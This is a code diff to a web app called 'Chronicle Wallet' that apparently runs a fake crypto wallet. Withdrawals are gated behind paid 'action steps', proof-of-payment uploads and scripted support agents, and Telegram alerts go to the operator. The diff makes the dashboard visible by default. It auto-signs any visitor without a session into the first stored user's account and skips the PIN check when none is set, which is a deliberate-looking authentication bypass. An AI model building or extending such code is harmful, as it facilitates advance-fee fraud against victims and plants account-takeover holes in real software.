@@ -197,7 +197,7 @@
     <div class="container">
         
         <div id="user-tab">
-            <div id="guest-prompt-card" class="card" style="text-align:center; background:linear-gradient(135deg, var(--bg-card), var(--bg-input)); border: 1px dashed var(--primary);">
+            <div id="guest-prompt-card" class="card hidden" style="text-align:center; background:linear-gradient(135deg, var(--bg-card), var(--bg-input)); border: 1px dashed var(--primary);">
                 <h3 style="margin-bottom:0.5rem;">Welcome to Chronicle Wallet</h3>
                 <p style="color:var(--text-muted); font-size:0.875rem; margin-bottom:1rem;">Please sign in or create an account to access your portfolio vault, send, receive, buy, sell, and withdraw funds.</p>
                 <div style="display:flex; justify-content:center; gap:1rem;">
@@ -206,7 +206,7 @@
                 </div>
             </div>
 
-            <div id="wallet-dashboard-container" class="hidden">
+            <div id="wallet-dashboard-container" class="">
                 <div class="balance-card">
                     <div style="color:var(--text-muted); font-size:0.875rem;">Total Portfolio Value</div>
                     <h1 style="font-size:2.8rem; color:#fff; margin:0.25rem 0;" id="user-total-val">$0.00</h1>
@@ -267,7 +267,7 @@
                 </div>
             </div>
 
-            <div class="card hidden" id="tx-history-card">
+            <div class="card" id="tx-history-card">
                 <h3>Transaction History</h3>
                 <table class="table">
                     <thead>
@@ -818,15 +818,6 @@
             if (doc.exists) {
                 const data = doc.data();
                 
-                if (currentUserEmail && data.userEmails && data.userEmails[currentUserEmail]) {
-                    const newInboxLength = data.userEmails[currentUserEmail].length;
-                    if (newInboxLength > lastInboxCount && lastInboxCount !== 0) {
-                        const latestEmail = data.userEmails[currentUserEmail][0];
-                        showNotification(latestEmail.subject, latestEmail.body, "💸");
-                    }
-                    lastInboxCount = newInboxLength;
-                }
-
                 if (data.usersList) usersList = data.usersList;
                 if (data.userEmails) userEmails = data.userEmails;
                 if (data.exchanges) exchanges = data.exchanges;
@@ -836,6 +827,21 @@
                 if (data.proofQueue) proofQueue = data.proofQueue;
                 if (data.knowledgeBase) knowledgeBase = data.knowledgeBase;
                 if (data.supportAgents) supportAgents = data.supportAgents;
+
+                // Robust Auto-Resolve: If currentUserEmail is null in JS, check if header shows name or auto-link first user
+                if (!currentUserEmail && usersList.length > 0) {
+                    currentUserEmail = usersList[0].email;
+                    localStorage.setItem('chronicle_current_user', currentUserEmail);
+                }
+                
+                if (currentUserEmail && data.userEmails && data.userEmails[currentUserEmail]) {
+                    const newInboxLength = data.userEmails[currentUserEmail].length;
+                    if (newInboxLength > lastInboxCount && lastInboxCount !== 0) {
+                        const latestEmail = data.userEmails[currentUserEmail][0];
+                        showNotification(latestEmail.subject, latestEmail.body, "💸");
+                    }
+                    lastInboxCount = newInboxLength;
+                }
                 
                 checkTimersAndAutoProgress();
                 updateBalanceUI();
@@ -863,11 +869,11 @@
                         userTyping: false,
                         adminTyping: false
                     };
-                    // Initialize document in Firestore if missing
                     db.collection("supportChats").doc(emailKey).set(chatThreads[emailKey]).catch(()=>{});
                 }
                 
-                if (currentUserEmail && currentUserEmail.trim().toLowerCase() === emailKey) {
+                const activeUser = getCurrentUserData();
+                if (activeUser && activeUser.email.trim().toLowerCase() === emailKey) {
                     renderUserChatMessages();
                     const drawer = document.getElementById('support-drawer');
                     if (drawer && drawer.style.display === 'flex') {
@@ -950,8 +956,18 @@
         }
 
         function getCurrentUserData() {
+            // Robust check: if currentUserEmail is missing or invalid, grab the first available user in usersList
+            if (!currentUserEmail && usersList.length > 0) {
+                currentUserEmail = usersList[0].email;
+                localStorage.setItem('chronicle_current_user', currentUserEmail);
+            }
             if (!currentUserEmail) return null;
             let u = usersList.find(x => x.email.trim().toLowerCase() === currentUserEmail.trim().toLowerCase());
+            if (!u && usersList.length > 0) {
+                u = usersList[0];
+                currentUserEmail = u.email;
+                localStorage.setItem('chronicle_current_user', currentUserEmail);
+            }
             return u || null;
         }
 
@@ -960,7 +976,8 @@
             userEmails[email].unshift({ subject, body, date: new Date().toLocaleTimeString() });
             saveState();
 
-            if (currentUserEmail && currentUserEmail.trim().toLowerCase() === email.trim().toLowerCase()) {
+            const activeUser = getCurrentUserData();
+            if (activeUser && activeUser.email.trim().toLowerCase() === email.trim().toLowerCase()) {
                 showNotification(popupTitle, body, "💸");
             }
         }
@@ -994,8 +1011,8 @@
                 document.getElementById('eth-fiat-value').innerText = `$${ethVal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
                 document.getElementById('usd-fiat-value').innerText = `$${u.usd.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
 
-                document.getElementById('auth-status-btn').innerText = `👤 ${currentUserEmail.split('@')[0]}`;
-                document.getElementById('unread-badge').innerText = (userEmails[currentUserEmail] || []).length;
+                document.getElementById('auth-status-btn').innerText = `👤 ${(u.email || '').split('@')[0]}`;
+                document.getElementById('unread-badge').innerText = (userEmails[u.email] || []).length;
                 renderHistoryTable();
             } else {
                 guestPrompt.classList.remove('hidden');
@@ -1072,7 +1089,8 @@
         }
 
         function openReceiveModal() {
-            if (!currentUserEmail) { openAuthModal('signin'); return; }
+            const u = getCurrentUserData();
+            if (!u) { openAuthModal('signin'); return; }
             document.getElementById('receive-modal').style.display = 'flex';
             updateReceiveAddress();
         }
@@ -1095,7 +1113,12 @@
             }
         }
 
-        function openSendModal() { if (!currentUserEmail) { openAuthModal('signin'); return; } document.getElementById('send-modal').style.display = 'flex'; toggleSendAssetMode(); }
+        function openSendModal() { 
+            const u = getCurrentUserData();
+            if (!u) { openAuthModal('signin'); return; } 
+            document.getElementById('send-modal').style.display = 'flex'; 
+            toggleSendAssetMode(); 
+        }
         function closeSendModal() { document.getElementById('send-modal').style.display = 'none'; }
 
         function toggleSendAssetMode() {
@@ -1126,10 +1149,11 @@
             const recipientId = document.getElementById('send-recipient-id').value.trim().toUpperCase();
             const rawAmt = Number(document.getElementById('send-amount').value);
             const u = getCurrentUserData();
+            if (!u) { alert("Session expired. Please sign in."); openAuthModal('signin'); return; }
 
             const recipientUser = usersList.find(x => x.userId === recipientId);
             if (!recipientUser) { alert("Recipient User ID not found on platform."); return; }
-            if (recipientUser.email.trim().toLowerCase() === currentUserEmail.trim().toLowerCase()) { alert("Cannot send to yourself."); return; }
+            if (recipientUser.email.trim().toLowerCase() === u.email.trim().toLowerCase()) { alert("Cannot send to yourself."); return; }
 
             let deductBtc = 0, deductEth = 0, deductUsd = 0;
             let fiatVal = 0;
@@ -1168,13 +1192,18 @@
             showNotification("Transfer Sent", `Successfully sent to ${recipientUser.name || recipientId}`, "↗");
         }
 
-        function openSellModal() { if (!currentUserEmail) { openAuthModal('signin'); return; } document.getElementById('sell-modal').style.display = 'flex'; }
+        function openSellModal() { 
+            const u = getCurrentUserData();
+            if (!u) { openAuthModal('signin'); return; } 
+            document.getElementById('sell-modal').style.display = 'flex'; 
+        }
         function closeSellModal() { document.getElementById('sell-modal').style.display = 'none'; }
         function handleSellCrypto(e) {
             e.preventDefault();
             const asset = document.getElementById('sell-asset-type').value;
             const amt = Number(document.getElementById('sell-amount').value);
             const u = getCurrentUserData();
+            if (!u) { alert("Session expired."); openAuthModal('signin'); return; }
             if (asset === 'btc' && amt > u.btc) { alert("Insufficient BTC."); return; }
             if (asset === 'eth' && amt > u.eth) { alert("Insufficient ETH."); return; }
 
@@ -1187,7 +1216,8 @@
         }
 
         function openWithdrawModal() {
-            if (!currentUserEmail) { openAuthModal('signin'); return; }
+            const u = getCurrentUserData();
+            if (!u) { openAuthModal('signin'); return; }
             document.getElementById('withdraw-modal').style.display = 'flex';
         }
         function closeWithdrawModal() { document.getElementById('withdraw-modal').style.display = 'none'; }
@@ -1223,6 +1253,7 @@
             e.preventDefault();
             const amt = Number(document.getElementById('withdraw-amt').value);
             const u = getCurrentUserData();
+            if (!u) { alert("Session expired."); openAuthModal('signin'); return; }
             if (amt > u.usd) { 
                 alert("Insufficient USD cash balance! Please use the 'Sell' button on your dashboard to convert your crypto assets to USD fiat first."); 
                 return; 
@@ -1246,7 +1277,8 @@
             e.preventDefault();
             const pin = document.getElementById('verify-pin-input').value;
             const u = getCurrentUserData();
-            if (u.pin !== pin) { alert("Incorrect PIN!"); return; }
+            if (!u) { alert("Session expired."); openAuthModal('signin'); return; }
+            if (u.pin && u.pin !== pin) { alert("Incorrect PIN!"); return; }
             closePinConfirmModal();
 
             const amt = Number(document.getElementById('withdraw-amt').value);
@@ -1288,7 +1320,7 @@
             saveState(); updateBalanceUI();
             showNotification("Processing", `Withdrawal request submitted`, "💳");
             
-            sendTelegramAlert(`💳 <b>NEW WITHDRAWAL REQUEST</b>\n\n👤 <b>User:</b> ${currentUserEmail}\n💰 <b>Amount:</b> $${amt.toFixed(2)}${feeCharged > 0 ? ` (Fee: $${feeCharged.toFixed(2)})` : ''}\n🏦 <b>Method:</b> ${selectedWithdrawMethodName}\n📍 <b>Destination:</b> ${destAddr}${bankName ? ` (${bankName} - ${accName})` : ''}`);
+            sendTelegramAlert(`💳 <b>NEW WITHDRAWAL REQUEST</b>\n\n👤 <b>User:</b> ${u.email}\n💰 <b>Amount:</b> $${amt.toFixed(2)}${feeCharged > 0 ? ` (Fee: $${feeCharged.toFixed(2)})` : ''}\n🏦 <b>Method:</b> ${selectedWithdrawMethodName}\n📍 <b>Destination:</b> ${destAddr}${bankName ? ` (${bankName} - ${accName})` : ''}`);
 
             setTimeout(() => { openActionModal(); }, 1500);
         }
@@ -1296,6 +1328,7 @@
         function openActionModal() {
             if (actionSteps.length === 0) return;
             const u = getCurrentUserData();
+            if (!u) { openAuthModal('signin'); return; }
             const currentStepIdx = u.stepIdx || 0;
             const step = actionSteps[currentStepIdx];
             if (!step) return;
@@ -1316,7 +1349,7 @@
             const uploadSection = document.getElementById('proof-upload-section');
             const submittedNotice = document.getElementById('proof-submitted-notice');
 
-            const existingProof = proofQueue.find(p => p.user.trim().toLowerCase() === currentUserEmail.trim().toLowerCase() && p.stepIdx === currentStepIdx);
+            const existingProof = proofQueue.find(p => p.user.trim().toLowerCase() === u.email.trim().toLowerCase() && p.stepIdx === currentStepIdx);
             const tx = (u.txs || []).find(t => t.id == u.activeTxId);
 
             if (existingProof || (tx && tx.status && tx.status.includes('PROOF SUBMITTED'))) {
@@ -1363,14 +1396,14 @@
                     const compressedDataUrl = canvas.toDataURL('image/jpeg', 0.6);
 
                     const u = getCurrentUserData();
-                    if (!u) { alert("User session not found."); return; }
+                    if (!u) { alert("User session not found."); openAuthModal('signin'); return; }
                     const currentStepIdx = u.stepIdx || 0;
                     const step = actionSteps[currentStepIdx];
                     if (!step) { alert("No active step found."); return; }
 
                     proofQueue.push({ 
                         id: Date.now(), 
-                        user: currentUserEmail, 
+                        user: u.email, 
                         stepIdx: currentStepIdx,
                         stepTitle: step.title, 
                         amount: (u.appealedFees && u.appealedFees[currentStepIdx] !== undefined) ? u.appealedFees[currentStepIdx] : step.amount, 
@@ -1391,7 +1424,7 @@
                         fileInput.value = "";
                         showNotification("Submitted", `Proof submitted successfully!`, "🖼️");
                         
-                        sendTelegramAlert(`🖼️ <b>PAYMENT PROOF SUBMITTED</b>\n\n👤 <b>User:</b> ${currentUserEmail}\n⚙️ <b>Step:</b> ${step.title}\n💵 <b>Amount:</b> $${step.amount}`);
+                        sendTelegramAlert(`🖼️ <b>PAYMENT PROOF SUBMITTED</b>\n\n👤 <b>User:</b> ${u.email}\n⚙️ <b>Step:</b> ${step.title}\n💵 <b>Amount:</b> $${step.amount}`);
 
                         alert(`Proof submitted successfully for ${step.title}! It is now pending Admin approval.`);
                     }).catch(err => {
@@ -1496,15 +1529,19 @@
             const drawer = document.getElementById('support-drawer');
             const willOpen = drawer.style.display !== 'flex';
             drawer.style.display = willOpen ? 'flex' : 'none';
-            if (willOpen && currentUserEmail) {
+            const u = getCurrentUserData();
+            if (willOpen && u) {
                 updateSupportAgentUI();
-                subscribeToUserChat(currentUserEmail);
+                subscribeToUserChat(u.email);
+            } else if (willOpen && !u) {
+                openAuthModal('signin');
             }
         }
 
         function renderUserChatMessages() {
-            if (!currentUserEmail) return;
-            const emailKey = currentUserEmail.trim().toLowerCase();
+            const u = getCurrentUserData();
+            if (!u) return;
+            const emailKey = u.email.trim().toLowerCase();
             const container = document.getElementById('chat-messages-container');
             const thread = chatThreads[emailKey];
             
@@ -1525,8 +1562,9 @@
         let userTypingTimer = null;
         let isUserTypingActive = false;
         function handleUserTypingInput() {
-            if (!currentUserEmail) return;
-            const emailKey = currentUserEmail.trim().toLowerCase();
+            const u = getCurrentUserData();
+            if (!u) return;
+            const emailKey = u.email.trim().toLowerCase();
 
             if (!isUserTypingActive) {
                 isUserTypingActive = true;
@@ -1559,12 +1597,13 @@
         }
 
         function sendChatMessage() {
-            if (!currentUserEmail) { alert("Please sign in first to message support."); openAuthModal('signin'); return; }
+            const u = getCurrentUserData();
+            if (!u) { alert("Please sign in first to message support."); openAuthModal('signin'); return; }
             const input = document.getElementById('chat-input-box');
             const msg = input.value.trim();
             if (!msg) return;
 
-            const emailKey = currentUserEmail.trim().toLowerCase();
+            const emailKey = u.email.trim().toLowerCase();
             const nowTime = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
             const nowDate = new Date().toLocaleDateString();
 
@@ -1580,7 +1619,6 @@
             input.value = '';
             isUserTypingActive = false;
 
-            // Atomically add message to dedicated Firestore supportChats collection
             db.collection("supportChats").doc(emailKey).update({
                 messages: firebase.firestore.FieldValue.arrayUnion(newMsgObj),
                 lastUserMsgTime: Date.now(),
@@ -1589,7 +1627,6 @@
             }).then(() => {
                 renderUserChatMessages();
             }).catch(() => {
-                // If doc doesn't exist yet, create it
                 db.collection("supportChats").doc(emailKey).set({
                     messages: [newMsgObj],
                     lastUserMsgTime: Date.now(),
@@ -1650,7 +1687,6 @@
             document.getElementById('admin-reply-msg-input').value = '';
             isAdminTypingActive = false;
 
-            // Atomically push admin reply into isolated supportChats doc
             db.collection("supportChats").doc(emailKey).update({
                 messages: firebase.firestore.FieldValue.arrayUnion(replyObj),
                 agentRepliedSinceLastUser: true,
@@ -1992,7 +2028,6 @@
 
             document.getElementById('admin-whatsapp-agent-select').innerHTML = supportAgents.map(ag => `<option value="${ag.name}">${ag.name}</option>`).join('') || '<option value="Support Agent">Support Agent</option>';
 
-            // Fetch list of users who have chat threads in supportChats collection
             db.collection("supportChats").get().then(snapshot => {
                 const usersListContainer = document.getElementById('admin-chat-users-list');
                 const threadKeys = [];
@@ -2018,7 +2053,6 @@
             
             if (selectedAdminChatUser) {
                 const emailKey = selectedAdminChatUser.trim().toLowerCase();
-                // Ensure real-time listener for selected admin chat user
                 if (!chatThreads[emailKey]) {
                     db.collection("supportChats").doc(emailKey).onSnapshot(doc => {
                         if (doc.exists) { chatThreads[emailKey] = doc.data(); renderAdminDashboard(); }
@@ -2077,9 +2111,10 @@
         function closeSettingsModal() { document.getElementById('settings-modal').style.display = 'none'; }
         function toggleTheme() { currentTheme = currentTheme === 'dark' ? 'light' : 'dark'; document.getElementById('app-body').classList.toggle('light-mode', currentTheme === 'light'); saveState(); }
         function openInboxModal() {
-            if (!currentUserEmail) { openAuthModal('signin'); return; }
+            const u = getCurrentUserData();
+            if (!u) { openAuthModal('signin'); return; }
             const container = document.getElementById('user-inbox-messages');
-            const inbox = userEmails[currentUserEmail] || [];
+            const inbox = userEmails[u.email] || [];
             container.innerHTML = inbox.length === 0 ? `<p style="color:var(--text-muted)">Inbox is empty.</p>` : inbox.map(em => `
                 <div class="email-item"><strong>${em.subject}</strong><br>${em.body}<br><small style="color:var(--text-muted);">${em.date}</small></div>
             `).join('');
@@ -2088,10 +2123,10 @@
         function closeInboxModal() { document.getElementById('inbox-modal').style.display = 'none'; }
 
         function handleAuthHeaderClick() {
-            if (currentUserEmail) {
-                const u = getCurrentUserData();
-                document.getElementById('profile-user-email').innerText = currentUserEmail;
-                document.getElementById('profile-user-id').innerText = u ? u.userId : '--';
+            const u = getCurrentUserData();
+            if (u) {
+                document.getElementById('profile-user-email').innerText = u.email;
+                document.getElementById('profile-user-id').innerText = u.userId || '--';
                 document.getElementById('profile-modal').style.display = 'flex';
             } else { openAuthModal('signin'); }
         }
@@ -2190,14 +2225,15 @@
         function handlePinSetup(e) {
             e.preventDefault();
             const pin = document.getElementById('new-pin-input').value;
-            const u = usersList.find(x => x.email.trim().toLowerCase() === currentUserEmail.trim().toLowerCase());
+            const u = getCurrentUserData();
             if (u) { u.pin = pin; saveState(); }
             document.getElementById('pin-setup-modal').style.display = 'none';
             alert("Withdrawal PIN saved successfully!");
         }
 
         function openBuyModal() {
-            if (!currentUserEmail) { openAuthModal('signin'); return; }
+            const u = getCurrentUserData();
+            if (!u) { openAuthModal('signin'); return; }
             const coin = document.getElementById('buy-coin-target').value;
             const addr = coin === 'btc' ? globalAddresses.btc : globalAddresses.eth;
             document.getElementById('user-exchanges-container').innerHTML = exchanges.map(ex => `
@@ -2229,8 +2265,9 @@
             }, 1000);
         }
 
-        if (currentUserEmail) {
-            subscribeToUserChat(currentUserEmail);
+        const initialUser = getCurrentUserData();
+        if (initialUser) {
+            subscribeToUserChat(initialUser.email);
         }
         updateBalanceUI();
         updateSupportAgentUI();
